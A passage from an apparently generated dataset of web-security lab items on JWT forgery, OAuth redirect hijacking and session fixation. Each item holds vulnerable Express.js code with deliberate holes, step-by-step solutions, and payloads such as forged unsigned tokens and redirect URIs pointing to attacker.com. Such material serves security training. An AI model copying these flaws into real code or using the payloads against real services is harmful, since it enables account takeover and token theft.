  "Lab Description": "This application accepts JWTs to authorize user access but fails to verify the signature if the algorithm is set to 'none'. This allows an attacker to forge arbitrary tokens and impersonate any user. To solve: Forge a JWT for Carlos by modifying the algorithm to 'none' and injecting the token into an authenticated request.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept a request containing a valid JWT after logging in as a normal user.",
    "Decode the JWT using jwt.io or similar tools and observe the header and payload.",
    "Modify the header to use {\"alg\":\"none\"} and change the payload to {\"user\":\"carlos\"}.",
    "Remove the signature portion entirely and re-encode the token.",
    "Send the modified token in the Authorization: Bearer header to access /account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'secretkey'; app.get('/account', (req, res) => { let token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.user === 'carlos') { return res.send('Carlos account data'); } else { return res.send('Generic user data'); } } catch (err) { return res.status(403).send('Invalid token'); } }); app.listen(4001);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"user\":\"carlos\"}",
    "JWT: base64url(header).base64url(payload). (no signature)",
    "Authorization: Bearer [forged_token]"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
  "Lab Description": "The OAuth implementation allows arbitrary redirection via a vulnerable redirect_uri parameter, enabling an attacker to hijack the authorization code. To solve: Craft a malicious redirect_uri that steals the authorization code for Carlos’s account, then exchange the code for an access token and access /account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate the OAuth flow and observe the redirect_uri parameter in the authorization URL.",
    "Modify the redirect_uri to point to your controlled server and URL-encode it.",
    "Send the modified URL to Carlos and capture the authorization code when he authenticates.",
    "Exchange the captured code with a POST request to /oauth/token to retrieve an access token.",
    "Use the token to access the protected resource /account with Authorization: Bearer."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const code = Math.random().toString(36).substring(2); codes[code] = 'carlos'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (codes[code]) { const token = Math.random().toString(36).substring(2); tokens[token] = codes[code]; return res.json({ access_token: token }); } res.status(403).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos private account'); res.status(403).send('Access denied'); }); app.listen(4002);",
  "payloads": [
    "https://vulnerable.app/authorize?client_id=xyz&redirect_uri=https://attacker.com/callback&state=abc",
    "Intercept: GET /callback?code=stolen_code",
    "POST /oauth/token with code=stolen_code",
    "GET /account with Authorization: Bearer [access_token]"
  ]
},
{
  "Lab scenario": "Session Fixation via Predictable Session Token in Login Flow",
  "Lab Description": "The application initializes a session token before login and fails to regenerate it post-authentication. The session token is predictable and does not get invalidated upon user login. To solve: Force a victim user (Carlos) to use a session ID you control, then access their account post-login.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to capture the GET /login request and note the Set-Cookie response with session ID.",
    "2. Observe that the session ID remains unchanged before and after successful login.",
    "3. In Burp Repeater, generate a session ID manually and craft a phishing link with a preset session cookie.",
    "4. Simulate the victim logging in using the session ID you created.",
    "5. Replay the session ID in your browser to access Carlos's account page after login."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\">User: <input name=\"username\"/>Pass: <input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/account'); } else { res.send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user === 'carlos') { res.send('Account page of Carlos'); } else { res.send('Not authorized'); } }); app.listen(3000);",
  "payloads": [
    "Set-Cookie: connect.sid=attacker-session; path=/; HttpOnly",
    "GET /login with crafted session",
    "Phish URL using attacker session",
    "Replay session after victim login"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Attack in API Authorization",
  "Lab Description": "The application's backend validates JWTs but does not enforce the algorithm used for signature verification. It trusts the 'alg' value in the JWT header. To solve: Forge a valid token for Carlos using 'none' algorithm and access his user dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Capture a legitimate JWT after login via Burp Suite.",
    "2. Decode the JWT using jwt.io and observe the alg: HS256 header.",
    "3. Replace alg with none and set the payload sub to carlos.",
    "4. Remove the JWT signature part completely.",
    "5. Use Postman to send the forged token in Authorization header and access /dashboard."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'jwtsecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === '1234') { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.sub === 'carlos') return res.send('Carlos Dashboard'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'carlos') res.send('Carlos Dashboard'); else res.status(403).send('Unauthorized'); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
    "{ \"sub\": \"carlos\" }",
    "Header.Payload.",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration - Trusting Unvalidated Redirect URIs",
  "Lab Description": "The OAuth provider implementation improperly accepts arbitrary redirect_uri values during the authorization flow. This allows malicious manipulation of the final redirect destination. To solve: Hijack Carlos’s OAuth session to leak his token via open redirect.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to observe the /auth endpoint in the OAuth flow.",
    "2. Modify the redirect_uri parameter to point to an attacker-controlled site.",
    "3. Send the manipulated OAuth link to Carlos (simulate or assume session capture).",
    "4. Upon OAuth login, the token is sent to the attacker domain.",
    "5. Use the leaked token in Postman to access Carlos’s account via API."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = { 'carlos': { password: 'abc123', token: 'token-carlos' } }; app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (!redirect_uri || !client_id || !response_type) return res.status(400).send('Invalid request'); const token = users['carlos'].token; const redirect = `${redirect_uri}?access_token=${token}`; res.redirect(redirect); }); app.get('/resource', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === users['carlos'].token) res.send('Sensitive data of Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
  "payloads": [
    "GET /auth?client_id=123&response_type=token&redirect_uri=https://attacker.site/callback",
    "OAuth token leak via attacker.site",
    "Authorization: Bearer token-carlos",
    "GET /resource with hijacked token"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Attack in Authorization Header",
  "Lab Description": "This lab uses JWT for session management with a misconfigured JWT verification logic. The application decodes the JWT token provided in the Authorization header and fails to verify the signature when the 'alg' header is set to 'none'. To solve: forge a valid-looking JWT token for the admin user using 'none' algorithm and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture the Authorization: Bearer <JWT> header after logging in using Burp Suite.",
    "Decode the JWT using jwt.io and inspect the algorithm and payload structure.",
    "Modify the JWT header to use \"alg\": \"none\" and payload to {\"user\": \"admin\"}, remove the signature.",
    "Send the modified JWT as Authorization header using Postman or Burp Repeater.",
    "Access /admin-dashboard to verify successful access with forged token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Admin Access Granted'); } try { const verified = jwt.verify(token, 'secretkey'); if (verified.user === 'admin') return res.send('Admin Access Verified'); } catch (err) { return res.status(403).send('Invalid token'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
  ]
},
{
  "Lab scenario": "Session Fixation via Login Flow in GraphQL",
  "Lab Description": "The application handles session identifiers insecurely via GraphQL mutations. It fails to regenerate session tokens upon successful login. An attacker can fix their session ID, trick a victim into logging in, and then hijack the authenticated session. To solve: fix a session ID before victim login, capture their session, and access their dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Send a GraphQL login mutation and observe Set-Cookie header using Burp Suite.",
    "Inject a known session ID using Cookie header and ensure it's accepted pre-login.",
    "Use CSRF or social engineering to force victim login with attacker-fixed session ID.",
    "Refresh the page with the fixed session ID to access victim's authenticated dashboard.",
    "Access /user-dashboard to confirm takeover of victim session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(session({ secret: 'sesskey', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; const schema = buildSchema(`type Query { login(username: String!, password: String!): String }`); const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; return 'Logged in'; } throw new Error('Invalid credentials'); } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.get('/user-dashboard', (req, res) => { if (req.session.user) return res.send('User dashboard of ' + req.session.user); res.status(403).send('Not logged in'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "Cookie: connect.sid=sess:attacker123",
    "GraphQL login mutation with attacker-fixed cookie",
    "GET /user-dashboard with stolen session cookie"
  ]
},
{
  "Lab scenario": "OAuth Access Token Leakage via Referrer Header",
  "Lab Description": "This lab involves a misconfigured OAuth flow leaking access tokens via the Referrer header. The application redirects users to a third-party analytics service after OAuth login, inadvertently exposing access tokens in the URL. To solve: leak an access token, capture it via a controlled endpoint, and use it to access the victim's profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate OAuth login via Burp to observe the token returned in the fragment of redirect URI.",
    "Notice redirect includes sensitive token in URL and a 302 to analytics.thirdparty.com.",
    "Host a public endpoint and configure redirect URI to attacker-controlled domain.",
    "Capture token via Referrer header from analytics redirect.",
    "Use intercepted token in Authorization header to access /profile of victim."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token) res.redirect('https://analytics.thirdparty.com/log?ref=' + encodeURIComponent(req.originalUrl)); else res.send('Missing token'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer leaked-oauth-token') return res.send('Carlos Profile'); res.status(403).send('Invalid token'); }); app.listen(6000, () => console.log('OAuth Referrer Leak Lab running'));",
  "payloads": [
    "GET /oauth/callback?token=leaked-oauth-token",
    "Redirect URL: https://attacker.site#token=leaked-oauth-token",
    "Authorization: Bearer leaked-oauth-token"
  ]
},
{
  "Lab scenario": "JWT authentication bypass via 'none' algorithm in token validation logic",
  "Lab Description": "The application uses JWTs for session management, but fails to enforce algorithm verification during token validation. The vulnerable backend accepts unsigned tokens when the 'alg' header is set to 'none'. To solve: Access Carlos's account without possessing his valid credentials.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a valid JWT token after logging into your account using Burp Suite.",
    "Use jwt.io or Postman to decode the JWT and observe the algorithm set as 'HS256'.",
    "Modify the token header to 'alg':'none' and remove the signature section entirely.",
    "Replace the payload to impersonate 'carlos' (e.g., {\"username\":\"carlos\"}) and re-encode the token.",
    "Send a request to /account with the modified token in the Authorization header and access the restricted content."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'insecure-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos') return res.send('Welcome carlos!'); res.send('Unauthorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Bypass running'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
  ]
},
{
  "Lab scenario": "Session fixation via pre-authenticated cookie reuse in login flow",
  "Lab Description": "This app allows session cookies to be set prior to login and fails to regenerate them upon successful authentication. The backend trusts any existing session ID, enabling an attacker to fixate a victim’s session. To solve: Access Carlos’s account by presetting a session and tricking him to log in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept your own login and observe that the session cookie remains unchanged after login.",
    "Generate a session cookie (e.g., session=attacker123) via a GET /login request before authentication.",
    "Craft a phishing link and get Carlos to log in while having the attacker-controlled session ID set in his browser.",
    "Once Carlos logs in, use the fixed session (attacker123) to access /account.",
    "Verify that you’re accessing Carlos's account with the stolen session ID."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('body-parser').urlencoded({ extended: true })); const users = { 'carlos': 'hunter2' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.session || Math.random().toString(36).substr(2); res.cookie('session', sid); res.send('<form method=post><input name=username><input name=password></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.redirect('/account'); } else res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Forbidden'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "Set-Cookie: session=attacker123",
    "Trick victim to login with attacker123 session active"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration via open redirect in authorization flow",
  "Lab Description": "This application integrates with an OAuth provider but does not properly validate the 'redirect_uri' parameter. This enables an attacker to hijack the authorization code and impersonate users. To solve: Hijack Carlos’s OAuth token by manipulating the redirect URI.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate an OAuth login and observe the redirect_uri parameter passed to the authorization endpoint.",
    "Modify the redirect_uri to an attacker-controlled domain that reflects authorization codes (e.g., http://attacker.com/capture?code=XXX).",
    "Send the manipulated login link to Carlos using a phishing method.",
    "Capture the authorization code when Carlos clicks and completes the login.",
    "Exchange the captured code at /oauth/callback endpoint to log in as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const client_id = 'app123'; const client_secret = 'topsecret'; const REDIRECTS = {}; app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; REDIRECTS[req.query.state] = redirect; const authURL = `http://oauth-provider.com/auth?client_id=${client_id}&redirect_uri=${redirect}&response_type=code&state=xyz`; res.redirect(authURL); }); app.get('/oauth/callback', async (req, res) => { const code = req.query.code; const state = req.query.state; const tokenRes = await axios.post('http://oauth-provider.com/token', { code, client_id, client_secret }); const user = tokenRes.data.user; res.send(`Logged in as ${user}`); }); app.listen(7000, () => console.log('OAuth Misconfig Lab running'));",
  "payloads": [
    "redirect_uri=http://attacker.com/capture",
    "http://oauth-provider.com/auth?client_id=app123&redirect_uri=http://attacker.com/capture&response_type=code"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login flow using REST API",
  "Lab Description": "The application uses REST API endpoints to manage login sessions but does not regenerate session tokens upon authentication. This introduces a session fixation vulnerability. The application continues to use the pre-login session identifier after successful login, allowing an attacker to predetermine a session for the victim. To solve: Hijack Carlos's session after forcing him to authenticate using a fixed session ID.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Intercept a GET /api/session request before login using Burp Suite to obtain a session ID.",
    "2. Craft a phishing link with this session ID as a cookie and lure the victim to log in.",
    "3. After victim logs in, reuse the fixed session ID to access authenticated endpoints.",
    "4. Verify Carlos’s login by calling GET /api/profile using the fixed session ID.",
    "5. Access GET /api/account/carlos with the hijacked session cookie to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': { password: 'securepass', profile: 'Sensitive data for Carlos' } }; app.get('/api/session', (req, res) => { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session', sid).json({ message: 'Session initialized' }); }); app.post('/api/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); if (users[username] && users[username].password === password) { sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Login successful'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/api/account/:user', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.authenticated && session.user === req.params.user) { res.send('Access granted to account of ' + req.params.user); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
  "payloads": [
    "GET /api/session -> Extract session cookie",
    "Phishing URL with cookie: session=sess_attackerControlled",
    "Force victim login under fixed session",
    "Use stolen session: session=sess_attackerControlled to access /api/account/carlos"
  ]
},
{
  "Lab scenario": "JWT token algorithm confusion in GraphQL authorization header",
  "Lab Description": "This application implements authentication using JWT tokens passed in the Authorization header. The server fails to enforce proper JWT signing algorithm, making it vulnerable to 'alg=none' attacks. The GraphQL resolver accepts unsigned tokens if the algorithm is altered to 'none'. To solve: Tamper a valid JWT to impersonate Carlos and retrieve his sensitive GraphQL data.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Capture a valid JWT token by logging into your own account via GraphQL using Postman.",
    "2. Decode the token using jwt.io and note the structure.",
    "3. Replace the 'alg' header from 'HS256' to 'none' and set the payload 'username' to 'carlos'.",
    "4. Remove the signature part entirely and resend the JWT in Authorization: Bearer header.",
    "5. Use GraphQL query `{userProfile {username, secretData}}` to verify Carlos's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const users = { carlos: { password: 'jwt123', secretData: 'Carlos JWT Secret' } }; const schema = buildSchema(`type Query { userProfile: User } type User { username: String, secretData: String }`); const root = { userProfile: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; if (!token) throw new Error('No token'); const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') return { username: 'carlos', secretData: users['carlos'].secretData }; const verified = jwt.verify(token, 'secret'); return { username: verified.username, secretData: users[verified.username].secretData }; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true, context: req }))); app.listen(4001);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}",
    "Unsigned token: base64(header).base64(payload).",
    "Authorization: Bearer [tampered-token]",
    "GraphQL query: { userProfile { username, secretData } }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in implicit flow token leakage via URL fragment",
  "Lab Description": "The application integrates third-party login via OAuth 2.0 implicit flow. The access token is exposed in the URL fragment after redirection and is not securely handled by the client. An attacker can capture the token via open redirect or history sniffing. To solve: Steal Carlos's access token and access his profile via the third-party login endpoint.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Observe the OAuth login process and note that access_token is returned in URL fragment.",
    "2. Craft an open redirect URI on your domain to capture fragment contents via JavaScript.",
    "3. Send Carlos a phishing link using the redirect_uri pointing to your server.",
    "4. Once token is received in fragment, use it to call GET /oauth/profile with Authorization: Bearer.",
    "5. Validate access to Carlos's profile and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const html = `<script>window.location='http://attacker.com#' + window.location.hash.substring(1);</script>`; res.send(html); }); app.get('/oauth/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === 'token-carlos') res.send('Carlos OAuth Profile Data'); else res.status(403).send('Invalid token'); }); app.listen(4002);",
  "payloads": [
    "Redirect URI: http://vulnerable.com/oauth/callback",
    "Crafted phishing URL: https://authserver.com/auth?client_id=123&response_type=token&redirect_uri=http://vulnerable.com/oauth/callback",
    "Capture token from fragment via JS: location.hash",
    "Authorization: Bearer token-carlos",
    "GET /oauth/profile"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion leading to token forgery",
  "Lab Description": "This lab features a JWT-based authentication system vulnerable to algorithm confusion. The application accepts tokens signed using either 'HS256' or 'RS256', but fails to validate the token signature correctly when the algorithm is manipulated. To solve: Forge a valid token as admin and access the /admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the login request and capture the JWT token.",
    "2. Decode the JWT using jwt.io or Postman to examine its header and payload. Note the use of the RS256 algorithm.",
    "3. Replace 'alg' in the JWT header from 'RS256' to 'HS256'. Use the public key as the HMAC secret.",
    "4. Re-sign the JWT using HS256 and the public key as the secret with jwt_tool or a Python script.",
    "5. Send the modified token using Burp Repeater to the /admin endpoint with the new Authorization header.",
    "6. Verify access to /admin and confirm the token is accepted without signature verification."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const PUBLIC_KEY = fs.readFileSync('./public.pem'); const PRIVATE_KEY = fs.readFileSync('./private.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.user === 'admin') res.send('Welcome admin'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "JWT with alg: 'HS256' and public key as secret",
    "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
    "Payload: {\"user\":\"admin\"}"
  ]
},
{
  "Lab scenario": "Session fixation through vulnerable redirect handler",
  "Lab Description": "This lab contains a login flow where session identifiers are not properly regenerated upon authentication. The redirect endpoint also reflects unvalidated session tokens. To solve: Fix a session before login, then authenticate as a victim and reuse the session to hijack the session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. In Burp, visit /redirect?next=/profile and observe the Set-Cookie header sets a new session ID.",
    "2. Save this session ID as the attacker.",
    "3. Trick the victim into visiting the /redirect?next=/profile link with attacker-fixed session ID (simulated).",
    "4. Victim logs in and is assigned the fixed session ID.",
    "5. Reuse the same session ID in Burp and access /profile to hijack the session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/redirect', (req, res) => { const sid = Math.random().toString(36).slice(2); sessions[sid] = { user: null }; res.cookie('sid', sid); res.redirect(req.query.next); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; const { username, password } = req.body; if (username === 'victim' && password === 'password') { sessions[sid].user = username; res.send('Login success'); } else { res.send('Invalid credentials'); } }); app.get('/profile', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].user) res.send(`Welcome ${sessions[sid].user}`); else res.send('Not logged in'); }); app.listen(4000);",
  "payloads": [
    "GET /redirect?next=/profile with fixed sid",
    "Cookie reuse with sid set pre-login",
    "POST /login with victim credentials while maintaining fixed sid"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allowing token reuse",
  "Lab Description": "This lab demonstrates a misconfigured OAuth implementation where access tokens are not bound to client identifiers, allowing a user to reuse tokens across client applications. To solve: Reuse an OAuth token issued for your own account to impersonate Carlos via a vulnerable client.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman to authorize your own user via /auth?client_id=trusted-app and retrieve the OAuth access token.",
    "2. In Burp, access /callback endpoint used by another app (e.g., /callback?token=...), replacing the token parameter with yours.",
    "3. Observe that your token is accepted, and the app grants access to your own account.",
    "4. Use sqlmap to enumerate OAuth logs at /admin/logs and extract valid token belonging to Carlos.",
    "5. Replay Carlos's token on /callback endpoint of trusted app.",
    "6. Access /account and confirm you're now authenticated as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { username, client_id } = req.query; const token = Buffer.from(username + ':' + client_id).toString('base64'); tokens[token] = username; res.redirect(`/callback?token=${token}`); }); app.get('/callback', (req, res) => { const username = tokens[req.query.token]; if (username) res.send(`Authenticated as ${username}`); else res.status(403).send('Invalid token'); }); app.listen(5000);",
  "payloads": [
    "GET /auth?username=attacker&client_id=trusted-app",
    "Replay of Carlos's token on /callback endpoint",
    "Access token: base64(carlos:trusted-app)"
  ]
},
{
  "Lab scenario": "Session Fixation in legacy session management",
  "Lab Description": "This lab uses an outdated session management mechanism where the session ID is not regenerated upon login. The application accepts session tokens from unauthenticated users and associates them to authenticated sessions without invalidating them. To solve: hijack Carlos's session after fixing a session for him and access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept the initial unauthenticated GET /login request using Burp Suite to observe the Set-Cookie: sessionID response.",
    "Confirm that the session cookie remains unchanged after successful login by performing a login and comparing pre/post cookies.",
    "Craft a phishing email link containing a known sessionID value and trick Carlos into logging in using it.",
    "Once Carlos logs in, reuse the fixed sessionID from your end by including it in a request to /account.",
    "Verify access by observing Carlos’s account details in the response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'password123' }; app.get('/login', (req, res) => { const sessionID = req.cookies.sessionID || Math.random().toString(36).substring(2); sessions[sessionID] = sessions[sessionID] || {}; res.cookie('sessionID', sessionID); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"/><input name=\"password\" type=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionID = req.cookies.sessionID; if (users[username] === password) { sessions[sessionID].user = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = sessions[req.cookies.sessionID]; if (session && session.user === 'carlos') { res.send('Welcome Carlos. Account info: [Sensitive Data]'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
  "payloads": [
    "GET /login with fixed sessionID in Cookie header",
    "POST /login with valid credentials and fixed sessionID",
    "GET /account with same sessionID to hijack session"
  ]
},
{
  "Lab scenario": "JWT tampering in public-key algorithm confusion",
  "Lab Description": "This application uses a JWT-based authentication mechanism with RS256 algorithm. However, it incorrectly treats the RSA public key as an HMAC secret, allowing token forgery. To solve: forge a JWT token impersonating the admin user and access the protected admin panel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the Authorization header after login and extract the JWT token.",
    "Decode the JWT using jwt.io or a local script and analyze the 'alg' and 'kid' headers.",
    "Replace the alg to 'HS256', and set the payload to {\"username\": \"admin\"}.",
    "Sign the token using the public RSA key as an HMAC secret using a tool like jwt_tool or custom Python script.",
    "Send the forged token in the Authorization header to /admin and confirm admin access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const PUBLIC_KEY = fs.readFileSync('./public.pem'); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, PUBLIC_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.username === 'admin') { res.send('Admin panel accessed'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "JWT header: {\"alg\": \"HS256\"}",
    "JWT payload: {\"username\": \"admin\"}",
